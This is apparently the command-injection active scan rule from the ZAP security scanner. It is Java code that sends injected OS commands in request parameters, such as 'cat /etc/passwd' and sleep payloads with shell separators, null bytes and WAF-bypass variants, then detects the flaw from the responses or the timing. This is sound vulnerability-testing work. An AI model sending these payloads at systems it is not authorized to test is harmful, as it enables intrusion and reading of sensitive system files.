/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2013 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrules;

import static org.zaproxy.zap.extension.ascanrules.utils.Constants.NULL_BYTE_CHARACTER;

import java.io.IOException;
import java.net.SocketException;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.commons.configuration.ConversionException;
import org.apache.commons.text.StringEscapeUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.commonlib.CommonAlertTag;
import org.zaproxy.addon.commonlib.timing.TimingUtils;
import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerabilities;
import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerability;
import org.zaproxy.zap.extension.ruleconfig.RuleConfigParam;
import org.zaproxy.zap.model.Tech;
import org.zaproxy.zap.model.TechSet;

/**
 * Active scan rule for Command Injection testing and verification.
 * https://owasp.org/www-community/attacks/Command_Injection
 *
 * @author yhawke (2013)
 */
public class CommandInjectionScanRule extends AbstractAppParamPlugin
        implements CommonActiveScanRuleInfo {

    /** The name of the rule to obtain the time, in seconds, for time-based attacks. */
    private static final String RULE_SLEEP_TIME = RuleConfigParam.RULE_COMMON_SLEEP_TIME;

    /** Prefix for internationalised messages used by this rule */
    private static final String MESSAGE_PREFIX = "ascanrules.commandinjection.";

    // *NIX OS Command constants
    private static final String NIX_TEST_CMD = "cat /etc/passwd";
    private static final Pattern NIX_CTRL_PATTERN = Pattern.compile("root:.:0:0");
    // Dot used to match 'x' or '!' (used in AIX)

    // Windows OS Command constants
    private static final String WIN_TEST_CMD = "type %SYSTEMROOT%\\win.ini";
    private static final Pattern WIN_CTRL_PATTERN = Pattern.compile("\\[fonts\\]");

    // PowerShell Command constants
    private static final String PS_TEST_CMD = "get-help";
    private static final Pattern PS_CTRL_PATTERN =
            Pattern.compile("(?:\\sGet-Help)(?i)|cmdlet|get-alias");

    // Useful if space char isn't allowed by filters
    // http://www.blackhatlibrary.net/Command_Injection
    private static final String BASH_SPACE_REPLACEMENT = "${IFS}";

    // OS Command payloads for command Injection testing
    private static final Map<String, Pattern> NIX_OS_PAYLOADS = new LinkedHashMap<>();
    private static final Map<String, Pattern> WIN_OS_PAYLOADS = new LinkedHashMap<>();
    private static final Map<String, Pattern> PS_PAYLOADS = new LinkedHashMap<>();

    private static final Map<String, String> ALERT_TAGS =
            CommonAlertTag.toMap(
                    CommonAlertTag.OWASP_2021_A03_INJECTION,
                    CommonAlertTag.OWASP_2017_A01_INJECTION,
                    CommonAlertTag.WSTG_V42_INPV_12_COMMAND_INJ);

    static {
        // No quote payloads
        NIX_OS_PAYLOADS.put(NIX_TEST_CMD, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("&" + NIX_TEST_CMD + "&", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put(";" + NIX_TEST_CMD + ";", NIX_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put(WIN_TEST_CMD, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("&" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        PS_PAYLOADS.put(PS_TEST_CMD, PS_CTRL_PATTERN);
        PS_PAYLOADS.put(";" + PS_TEST_CMD, PS_CTRL_PATTERN);

        // Double quote payloads
        NIX_OS_PAYLOADS.put("\"&" + NIX_TEST_CMD + "&\"", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\";" + NIX_TEST_CMD + ";\"", NIX_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\"&" + WIN_TEST_CMD + "&\"", WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\"|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        PS_PAYLOADS.put("\";" + PS_TEST_CMD, PS_CTRL_PATTERN);

        // Single quote payloads
        NIX_OS_PAYLOADS.put("'&" + NIX_TEST_CMD + "&'", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("';" + NIX_TEST_CMD + ";'", NIX_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("'&" + WIN_TEST_CMD + "&'", WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("'|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        PS_PAYLOADS.put("';" + PS_TEST_CMD, PS_CTRL_PATTERN);

        // Special payloads
        NIX_OS_PAYLOADS.put("\n" + NIX_TEST_CMD + "\n", NIX_CTRL_PATTERN); // force enter
        NIX_OS_PAYLOADS.put("`" + NIX_TEST_CMD + "`", NIX_CTRL_PATTERN); // backtick execution
        NIX_OS_PAYLOADS.put("||" + NIX_TEST_CMD, NIX_CTRL_PATTERN); // or control concatenation
        NIX_OS_PAYLOADS.put("&&" + NIX_TEST_CMD, NIX_CTRL_PATTERN); // and control concatenation
        NIX_OS_PAYLOADS.put("|" + NIX_TEST_CMD + "#", NIX_CTRL_PATTERN); // pipe & comment
        // FoxPro for running os commands
        WIN_OS_PAYLOADS.put("run " + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        PS_PAYLOADS.put(";" + PS_TEST_CMD + " #", PS_CTRL_PATTERN); // chain & comment

        // uninitialized variable waf bypass
        String insertedCMD = insertUninitVar(NIX_TEST_CMD);
        // No quote payloads
        NIX_OS_PAYLOADS.put("&" + insertedCMD + "&", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put(";" + insertedCMD + ";", NIX_CTRL_PATTERN);
        // Double quote payloads
        NIX_OS_PAYLOADS.put("\"&" + insertedCMD + "&\"", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\";" + insertedCMD + ";\"", NIX_CTRL_PATTERN);
        // Single quote payloads
        NIX_OS_PAYLOADS.put("'&" + insertedCMD + "&'", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("';" + insertedCMD + ";'", NIX_CTRL_PATTERN);
        // Special payloads
        NIX_OS_PAYLOADS.put("\n" + insertedCMD + "\n", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("`" + insertedCMD + "`", NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("||" + insertedCMD, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("&&" + insertedCMD, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("|" + insertedCMD + "#", NIX_CTRL_PATTERN);

        // Used for *nix
        // OS_PAYLOADS.put("\"|\"ld", null);
        // OS_PAYLOADS.put("'|'ld", null);

        /**
         * Null Byte Payloads. Say NIX OS is there and original input is "image". Now Vulnerable
         * application is executing command as "cat" + <input value>+ ".jpeg". If ZAP payload is
         * ";cat /etc/passwd" then the final value passed to Vulnerable application is "image;cat
         * /etc/passwd" and Command executed by application is "cat image;cat /etc/passwd.jpeg" and
         * it will not succeed but if we add null byte to the payload then command executed by
         * application will be "cat image;cat /etc/passwd\0.jpeg" and hence .jpeg will be ignored
         * and attack will succeed. Here we are not adding null byte before the payload i.e.
         * "image\0;cat /etc/passwd" reason is then the underline C/C++ utility stops execution as
         * it finds null byte. More information:
         * http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection
         */
        // No quote payloads
        NIX_OS_PAYLOADS.put(";" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);

        WIN_OS_PAYLOADS.put("&" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("|" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);

        // Double quote payloads
        NIX_OS_PAYLOADS.put("\"&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\";" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);

        WIN_OS_PAYLOADS.put("\"&" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("\"|" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);

        // Single quote payloads
        NIX_OS_PAYLOADS.put("'&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("';" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);

        WIN_OS_PAYLOADS.put("'&" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
        WIN_OS_PAYLOADS.put("'|" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);

        // Special payloads
        NIX_OS_PAYLOADS.put(
                "||" + NIX_TEST_CMD + NULL_BYTE_CHARACTER,
                NIX_CTRL_PATTERN); // or control concatenation
        NIX_OS_PAYLOADS.put(
                "&&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER,
                NIX_CTRL_PATTERN); // and control concatenation
        // FoxPro for running os commands
        WIN_OS_PAYLOADS.put("run " + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);

        // uninitialized variable waf bypass
        insertedCMD = insertUninitVar(NIX_TEST_CMD);
        // No quote payloads
        NIX_OS_PAYLOADS.put("&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put(";" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        // Double quote payloads
        NIX_OS_PAYLOADS.put("\"&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("\";" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        // Single quote payloads
        NIX_OS_PAYLOADS.put("'&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("';" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        // Special payloads
        NIX_OS_PAYLOADS.put("||" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
        NIX_OS_PAYLOADS.put("&&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
    }

    /** The default number of seconds used in time-based attacks (i.e. sleep commands). */
    private static final int DEFAULT_TIME_SLEEP_SEC = 5;

    // limit the maximum number of requests sent for time-based attack detection
    private static final int BLIND_REQUESTS_LIMIT = 4;

    // error range allowable for statistical time-based blind attacks (0-1.0)
    private static final double TIME_CORRELATION_ERROR_RANGE = 0.15;
    private static final double TIME_SLOPE_ERROR_RANGE = 0.30;

    // *NIX Blind OS Command constants
    private static final String NIX_BLIND_TEST_CMD = "sleep {0}";
    // Windows Blind OS Command constants
    private static final String WIN_BLIND_TEST_CMD = "timeout /T {0}";
    // PowerSHell Blind Command constants
    private static final String PS_BLIND_TEST_CMD = "start-sleep -s {0}";

    // OS Command payloads for blind command Injection testing
    private static final List<String> NIX_BLIND_OS_PAYLOADS = new LinkedList<>();
    private static final List<String> WIN_BLIND_OS_PAYLOADS = new LinkedList<>();
    private static final List<String> PS_BLIND_PAYLOADS = new LinkedList<>();

    static {
        // No quote payloads
        NIX_BLIND_OS_PAYLOADS.add("&" + NIX_BLIND_TEST_CMD + "&");
        NIX_BLIND_OS_PAYLOADS.add(";" + NIX_BLIND_TEST_CMD + ";");
        WIN_BLIND_OS_PAYLOADS.add("&" + WIN_BLIND_TEST_CMD);
        WIN_BLIND_OS_PAYLOADS.add("|" + WIN_BLIND_TEST_CMD);
        PS_BLIND_PAYLOADS.add(";" + PS_BLIND_TEST_CMD);

        // Double quote payloads
        NIX_BLIND_OS_PAYLOADS.add("\"&" + NIX_BLIND_TEST_CMD + "&\"");
        NIX_BLIND_OS_PAYLOADS.add("\";" + NIX_BLIND_TEST_CMD + ";\"");
        WIN_BLIND_OS_PAYLOADS.add("\"&" + WIN_BLIND_TEST_CMD + "&\"");
        WIN_BLIND_OS_PAYLOADS.add("\"|" + WIN_BLIND_TEST_CMD);
        PS_BLIND_PAYLOADS.add("\";" + PS_BLIND_TEST_CMD);

        // Single quote payloads
        NIX_BLIND_OS_PAYLOADS.add("'&" + NIX_BLIND_TEST_CMD + "&'");
        NIX_BLIND_OS_PAYLOADS.add("';" + NIX_BLIND_TEST_CMD + ";'");
        WIN_BLIND_OS_PAYLOADS.add("'&" + WIN_BLIND_TEST_CMD + "&'");
        WIN_BLIND_OS_PAYLOADS.add("'|" + WIN_BLIND_TEST_CMD);
        PS_BLIND_PAYLOADS.add("';" + PS_BLIND_TEST_CMD);

        // Special payloads
        NIX_BLIND_OS_PAYLOADS.add("\n" + NIX_BLIND_TEST_CMD + "\n"); // force enter
        NIX_BLIND_OS_PAYLOADS.add("`" + NIX_BLIND_TEST_CMD + "`"); // backtick execution
        NIX_BLIND_OS_PAYLOADS.add("||" + NIX_BLIND_TEST_CMD); // or control concatenation
        NIX_BLIND_OS_PAYLOADS.add("&&" + NIX_BLIND_TEST_CMD); // and control concatenation
        NIX_BLIND_OS_PAYLOADS.add("|" + NIX_BLIND_TEST_CMD + "#"); // pipe & comment
        // FoxPro for running os commands
        WIN_BLIND_OS_PAYLOADS.add("run " + WIN_BLIND_TEST_CMD);
        PS_BLIND_PAYLOADS.add(";" + PS_BLIND_TEST_CMD + " #"); // chain & comment

        // uninitialized variable waf bypass
        String insertedCMD = insertUninitVar(NIX_BLIND_TEST_CMD);
        // No quote payloads
        NIX_BLIND_OS_PAYLOADS.add("&" + insertedCMD + "&");
        NIX_BLIND_OS_PAYLOADS.add(";" + insertedCMD + ";");
        // Double quote payloads
        NIX_BLIND_OS_PAYLOADS.add("\"&" + insertedCMD + "&\"");
        NIX_BLIND_OS_PAYLOADS.add("\";" + insertedCMD + ";\"");
        // Single quote payloads
        NIX_BLIND_OS_PAYLOADS.add("'&" + insertedCMD + "&'");
        NIX_BLIND_OS_PAYLOADS.add("';" + insertedCMD + ";'");
        // Special payloads
        NIX_BLIND_OS_PAYLOADS.add("\n" + insertedCMD + "\n");
        NIX_BLIND_OS_PAYLOADS.add("`" + insertedCMD + "`");
        NIX_BLIND_OS_PAYLOADS.add("||" + insertedCMD);
        NIX_BLIND_OS_PAYLOADS.add("&&" + insertedCMD);
        NIX_BLIND_OS_PAYLOADS.add("|" + insertedCMD + "#");
    }

    // Logger instance
    private static final Logger LOGGER = LogManager.getLogger(CommandInjectionScanRule.class);

    // Get WASC Vulnerability description
    private static final Vulnerability VULN = Vulnerabilities.getDefault().get("wasc_31");

    /** The number of seconds used in time-based attacks (i.e. sleep commands). */
    private int timeSleepSeconds = DEFAULT_TIME_SLEEP_SEC;

    private enum TestType {
        FEEDBACK("feedback-based"),
        TIME("time-based");

        private final String nameKey;

        private TestType(String nameKey) {
            this.nameKey = nameKey;
        }

        String getNameKey() {
            return nameKey;
        }
    }

    @Override
    public int getId() {
        return 90020;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public boolean targets(TechSet technologies) {
        if (technologies.includes(Tech.Linux)
                || technologies.includes(Tech.MacOS)
                || technologies.includes(Tech.Windows)) {
            return true;
        }
        return false;
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        return VULN.getSolution();
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    @Override
    public Map<String, String> getAlertTags() {
        return ALERT_TAGS;
    }

    @Override
    public int getCweId() {
        return 78;
    }

    @Override
    public int getWascId() {
        return 31;
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    private String getOtherInfo(TestType testType, String testValue) {
        return Constant.messages.getString(
                MESSAGE_PREFIX + "otherinfo." + testType.getNameKey(), testValue);
    }

    @Override
    public void init() {
        try {
            timeSleepSeconds = this.getConfig().getInt(RULE_SLEEP_TIME, DEFAULT_TIME_SLEEP_SEC);
        } catch (ConversionException e) {
            LOGGER.debug(
                    "Invalid value for '{}': {}",
                    RULE_SLEEP_TIME,
                    this.getConfig().getString(RULE_SLEEP_TIME));
        }
        LOGGER.debug("Sleep set to {} seconds", timeSleepSeconds);
    }

    /**
     * Gets the number of seconds used in time-based attacks.
     *
     * <p><strong>Note:</strong> Method provided only to ease the unit tests.
     *
     * @return the number of seconds used in time-based attacks.
     */
    int getTimeSleep() {
        return timeSleepSeconds;
    }

    /**
     * Scan for OS Command Injection Vulnerabilities
     *
     * @param msg a request only copy of the original message (the response isn't copied)
     * @param paramName the parameter name that need to be exploited
     * @param value the original parameter value
     */
    @Override
    public void scan(HttpMessage msg, String paramName, String value) {

        // Begin scan rule execution
        LOGGER.debug(
                "Checking [{}][{}], parameter [{}] for OS Command Injection Vulnerabilities",
                msg.getRequestHeader().getMethod(),
                msg.getRequestHeader().getURI(),
                paramName);

        // Number of targets to try
        int targetCount = 0;
        int blindTargetCount = 0;

        switch (this.getAttackStrength()) {
            case LOW:
                targetCount = 3;
                blindTargetCount = 2;
                break;

            case MEDIUM:
                targetCount = 7;
                blindTargetCount = 6;
                break;

            case HIGH:
                targetCount = 13;
                blindTargetCount = 12;
                break;

            case INSANE:
                targetCount =
                        Math.max(
                                PS_PAYLOADS.size(),
                                (Math.max(NIX_OS_PAYLOADS.size(), WIN_OS_PAYLOADS.size())));
                blindTargetCount =
                        Math.max(
                                PS_BLIND_PAYLOADS.size(),
                                (Math.max(
                                        NIX_BLIND_OS_PAYLOADS.size(),
                                        WIN_BLIND_OS_PAYLOADS.size())));
                break;

            default:
                // Default to off
        }

        if (inScope(Tech.Linux) || inScope(Tech.MacOS)) {
            if (testCommandInjection(
                    paramName,
                    value,
                    targetCount,
                    blindTargetCount,
                    NIX_OS_PAYLOADS,
                    NIX_BLIND_OS_PAYLOADS)) {
                return;
            }
        }

        if (isStop()) {
            return;
        }

        if (inScope(Tech.Windows)) {
            // Windows Command Prompt
            if (testCommandInjection(
                    paramName,
                    value,
                    targetCount,
                    blindTargetCount,
                    WIN_OS_PAYLOADS,
                    WIN_BLIND_OS_PAYLOADS)) {
                return;
            }
            // Check if the user has stopped the scan
            if (isStop()) {
                return;
            }
            // Windows PowerShell
            if (testCommandInjection(
                    paramName,
                    value,
                    targetCount,
                    blindTargetCount,
                    PS_PAYLOADS,
                    PS_BLIND_PAYLOADS)) {
                return;
            }
        }
    }

    /**
     * Tests for injection vulnerabilities with the given payloads.
     *
     * @param paramName the name of the parameter that will be used for testing for injection
     * @param value the value of the parameter that will be used for testing for injection
     * @param targetCount the number of requests for normal payloads
     * @param blindTargetCount the number of requests for blind payloads
     * @param osPayloads the normal payloads
     * @param blindOsPayloads the blind payloads
     * @return {@code true} if the vulnerability was found, {@code false} otherwise.
     */
    private boolean testCommandInjection(
            String paramName,
            String value,
            int targetCount,
            int blindTargetCount,
            Map<String, Pattern> osPayloads,
            List<String> blindOsPayloads) {
        // Start testing OS Command Injection patterns
        // ------------------------------------------
        String payload;
        String paramValue;
        Iterator<String> it = osPayloads.keySet().iterator();
        boolean firstPayload = true;

        // -----------------------------------------------
        // Check 1: Feedback based OS Command Injection
        // -----------------------------------------------
        // try execution check sending a specific payload
        // and verifying if it returns back the output inside
        // the response content
        // -----------------------------------------------
        for (int i = 0; it.hasNext() && (i < targetCount); i++) {
            payload = it.next();
            if (osPayloads.get(payload).matcher(getBaseMsg().getResponseBody().toString()).find()) {
                continue; // The original matches the detection so continue to next
            }

            HttpMessage msg = getNewMsg();
            paramValue = firstPayload ? payload : value + payload;
            firstPayload = false;
            setParameter(msg, paramName, paramValue);

            LOGGER.debug("Testing [{}] = [{}]", paramName, paramValue);

            try {
                // Send the request and retrieve the response
                try {
                    sendAndReceive(msg, false);
                } catch (SocketException ex) {
                    LOGGER.debug(
                            "Caught {} {} when accessing: {}.\n The target may have replied with a poorly formed redirect due to our input.",
                            ex.getClass().getName(),
                            ex.getMessage(),
                            msg.getRequestHeader().getURI());
                    continue; // Something went wrong, move to next payload iteration
                }

                // Check if the injected content has been evaluated and printed
                String content = msg.getResponseBody().toString();

                if (msg.getResponseHeader().hasContentType("html")) {
                    content = StringEscapeUtils.unescapeHtml4(content);
                }

                Matcher matcher = osPayloads.get(payload).matcher(content);
                if (matcher.find()) {
                    // We Found IT!
                    // First do logging
                    LOGGER.debug(
                            "[OS Command Injection Found] on parameter [{}] with value [{}]",
                            paramName,
                            paramValue);
                    String otherInfo = getOtherInfo(TestType.FEEDBACK, paramValue);

                    buildAlert(paramName, paramValue, matcher.group(), otherInfo, msg).raise();

                    // All done. No need to look for vulnerabilities on subsequent
                    // payloads on the same request (to reduce performance impact)
                    return true;
                }

            } catch (IOException ex) {
                // Do not try to internationalise this.. we need an error message in any event..
                // if it's in English, it's still better than not having it at all.
                LOGGER.warn(
                        "Command Injection vulnerability check failed for parameter [{}] and payload [{}] due to an I/O error",
                        paramName,
                        payload,
                        ex);
            }

            // Check if the scan has been stopped
            // if yes dispose resources and exit
            if (isStop()) {
                // Dispose all resources
                // Exit the scan rule
                return false;
            }
        }

        // -----------------------------------------------
        // Check 2: Time-based Blind OS Command Injection
        // -----------------------------------------------
        // Check for a sleep shell execution by using
        // linear regression to check for a correlation
        // between requested delay and actual delay.
        // -----------------------------------------------

        it = blindOsPayloads.iterator();

        for (int i = 0; it.hasNext() && (i < blindTargetCount); i++) {
            AtomicReference<HttpMessage> message = new AtomicReference<>();
            String sleepPayload = it.next();
            paramValue = value + sleepPayload.replace("{0}", String.valueOf(timeSleepSeconds));

            // the function that will send each request
            TimingUtils.RequestSender requestSender =
                    x -> {
                        HttpMessage msg = getNewMsg();
                        message.set(msg);
                        String finalPayload =
                                value + sleepPayload.replace("{0}", String.valueOf(x));
                        setParameter(msg, paramName, finalPayload);
                        LOGGER.debug("Testing [{}] = [{}]", paramName, finalPayload);

                        // send the request and retrieve the response
                        sendAndReceive(msg, false);
                        return msg.getTimeElapsedMillis() / 1000.0;
                    };

            boolean isInjectable;
            try {
                try {
                    // use TimingUtils to detect a response to sleep payloads
                    isInjectable =
                            TimingUtils.checkTimingDependence(
                                    BLIND_REQUESTS_LIMIT,
                                    timeSleepSeconds,
                                    requestSender,
                                    TIME_CORRELATION_ERROR_RANGE,
                                    TIME_SLOPE_ERROR_RANGE);
                } catch (SocketException ex) {
                    LOGGER.debug(
                            "Caught {} {} when accessing: {}.\n The target may have replied with a poorly formed redirect due to our input.",
                            ex.getClass().getName(),
                            ex.getMessage(),
                            message.get().getRequestHeader().getURI());
                    continue; // Something went wrong, move to next blind iteration
                }

                if (isInjectable) {
                    // We Found IT!
                    // First do logging
                    LOGGER.debug(
                            "[Blind OS Command Injection Found] on parameter [{}] with value [{}]",
                            paramName,
                            paramValue);
                    String otherInfo = getOtherInfo(TestType.TIME, paramValue);

                    // just attach this alert to the last sent message
                    buildAlert(paramName, paramValue, "", otherInfo, message.get()).raise();

                    // All done. No need to look for vulnerabilities on subsequent
                    // payloads on the same request (to reduce performance impact)
                    return true;
                }
            } catch (IOException ex) {
                // Do not try to internationalise this.. we need an error message in any event..
                // if it's in English, it's still better than not having it at all.
                LOGGER.warn(
                        "Blind Command Injection vulnerability check failed for parameter [{}] and payload [{}] due to an I/O error",
                        paramName,
                        paramValue,
                        ex);
            }

            // Check if the scan has been stopped
            // if yes dispose resources and exit
            if (isStop()) {
                // Dispose all resources
                // Exit the scan rule
                return false;
            }
        }
        return false;
    }

    /**
     * Generate payload variants for uninitialized variable waf bypass
     * https://www.secjuice.com/web-application-firewall-waf-evasion/
     *
     * @param cmd the cmd to insert uninitialized variable
     */
    private static String insertUninitVar(String cmd) {
        int varLength = ThreadLocalRandom.current().nextInt(1, 3) + 1;
        char[] array = new char[varLength];
        // $xx
        array[0] = '$';
        for (int i = 1; i < varLength; ++i) {
            array[i] = (char) ThreadLocalRandom.current().nextInt(97, 123);
        }
        String var = new String(array);

        // insert variable before each space and '/' in the path
        return cmd.replaceAll("\\s", Matcher.quoteReplacement(var + " "))
                .replaceAll("\\/", Matcher.quoteReplacement(var + "/"));
    }

    private AlertBuilder buildAlert(
            String param, String attack, String evidence, String otherInfo, HttpMessage msg) {
        return newAlert()
                .setConfidence(Alert.CONFIDENCE_MEDIUM)
                .setParam(param)
                .setAttack(attack)
                .setEvidence(evidence)
                .setMessage(msg)
                .setOtherInfo(otherInfo);
    }

    @Override
    public List<Alert> getExampleAlerts() {
        return List.of(
                buildAlert(
                                "qry",
                                "a;cat /etc/passwd ",
                                "root:x:0:0",
                                getOtherInfo(TestType.FEEDBACK, "a;cat /etc/passwd "),
                                null)
                        .build());
    }
}
